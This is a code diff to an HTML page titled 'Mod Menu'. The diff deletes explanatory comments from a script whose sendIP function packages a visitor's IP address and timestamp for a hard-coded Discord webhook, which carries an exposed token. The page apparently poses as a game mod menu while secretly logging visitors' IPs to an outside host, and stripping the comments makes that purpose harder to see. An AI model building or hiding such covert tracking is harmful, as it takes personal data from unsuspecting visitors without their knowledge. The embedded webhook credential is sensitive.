@@ -6,12 +6,9 @@
 <body>
   <h1>Mod Menu</h1>
   <script>
-    // Function to send the IP and timestamp using a Discord webhook
     function sendIP(ip, timestamp) {
-      // Replace 'WEBHOOK_URL' with your actual Discord webhook URL
       var webhookURL = 'https://discord.com/api/webhooks/1155301904771973282/4CL70Krtsq1VSUM8nCYTXyTaRWYknNQlVn1zROZ21tOcvwdAL9cZ-IzlVRRl6Rx_7UKx';
 
-      // Create a JSON payload with the IP and timestamp
       var payload = JSON.stringify({
         content: 'IP: ' + ip + ', Timestamp: ' + timestamp
       });
